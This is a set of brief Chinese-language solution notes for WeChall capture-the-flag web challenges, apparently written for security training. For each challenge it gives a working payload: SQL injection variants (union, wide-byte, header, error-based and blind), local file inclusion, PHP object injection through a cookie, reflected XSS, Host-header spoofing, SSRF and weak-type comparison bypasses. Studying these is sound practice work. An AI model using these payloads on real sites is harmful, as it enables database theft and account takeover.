## No Escape  
mysql_real_escape_string不过滤`
$who = bill`=111#

##LFI
file=../../solution.php%00

##php 0817
switch弱类型匹配
which=solution 匹配到case 0:
中间没有break，成功包含

##Register Globals
globals.php?login[0]=admin

##Are You Serial?
__autoload自动包含 SERIAL_Solution.php
unserialize函数解析出 SERIAL_Solution类自动包含，执行__wakeup()
Cookie: serial_user= serialize(new SERIAL_Solution())

##PHP 0819
$spaceone必须是一个字符串'1337',定界符定义字符串
?eval=%3C%3C%3Ca%0A1337%0Aa%3B%0A

##HOST me
HTTP/1.1 支持绝对网址，host可以欺骗apache
GET http://www.wechall.net/challenge/space/host_me/index.php HTTP/1.1
Host: localhost

##php 0815
$show需要在in_array之前类型转换，in_array()弱类型比较
$show = $show +0(/1,*1,|0)...
in_array('','',1)或者把in_array()改成===比较


##stop us
php脚本可以中途暂停，前提是有ignore_user_abort(setting) 为false， 而且必须存在flush（），php脚本才能正确识别连接中断。buffering 必须被禁止，不然php脚本会完全执行
在加完domain之后断开连接就可以免费买了


##php 0818
弱类型比较
16进制字符串和10进制字符串可以相等
'0xdeadc0de' == '3735929054'

##htmlspecialchars
默认 ENT_COMPAT | ENT_HTML401. 实体化双引号并且html 4.01标准处理代码
改成 ENT_QUOTES
echo "<a href='http://".htmlspecialchars(Common::getPost('input'),ENT_QUOTES)."'>Exploit Me</a>";


##PHP 0816
逻辑漏洞，GET的参数mode=hl在src前可以绕过src的检查

##Yourself PHP
$_SERVER['php_self'] 安全性问题， index.php/xsscode可以随意注入
www.wechall.net/challenge/yourself_php/index.php?"><script>alert(1);</script>

##The Guestbook
insert into ??? values('ip','message') ip没有过滤并且是xff先取，xff注入即可
X-Forwarded-For: 127.0.0.1',substr((select gbu_password from gbook_user where gbu_name='Admin'),1))#


##Crappyshare
ssrf
file://solution.php


##Addslashes
宽字节注入
username=%df%27or%201%20and%20username=0x61646d696e%23&password=456&login=%E6%B3%A8%E5%86%8C


##RegexMini
^$匹配
$ 是用于断言当前匹配点位于目标字符串末尾， 或当目标字符串以换行符结尾时当前匹配点位于该换行符位置(默认情况)。最后是%0a换行符也匹配
多行模式下^$也匹配开头的%0a换行符


##Order By Query 
order by 参数存在注入
有报错回显，可以报错注入
/index.php?by=3 and (extractvalue(1,concat(0x7e,(select substr(password,11) from users where username=0x41646d696e),0x7e)))%23


##Training: MySQL I
username = admin'#

##Training: MySQL II
union 可以污染查询出来的结果
result[id]=1
result[username]=admin
result[password]=md5('')
' and 0 union select 1,'admin',md5('')#

##Blinded by the light
SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'
password = ' or ord(substr(password,1,1))=50#
只有一条数据，所以用where password条件获得的数据只有正确的password，盲注即可
